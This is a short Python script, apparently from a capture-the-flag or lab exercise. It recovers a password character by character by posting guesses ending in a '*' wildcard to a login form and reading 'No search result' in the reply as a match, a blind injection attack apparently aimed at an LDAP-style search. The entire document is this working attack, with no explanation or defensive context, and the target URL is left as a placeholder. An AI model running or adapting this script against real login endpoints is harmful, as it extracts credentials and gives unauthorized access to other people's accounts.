import requests
import string
#creat Charectors list
char_list = list(string.ascii_letters + string.digits + string.punctuation)

url="#"
myobj = {'username':'0' , 'password':'0'}
result=""

flag = 1
while flag==1:
    flag=0
    for i in char_list:
        myobj['password'] = result + i + '*'
        r = requests.post(url,data = myobj)
        if ('No search result' in r.text):
            result+=i
            flag=1
            print (result)
            break
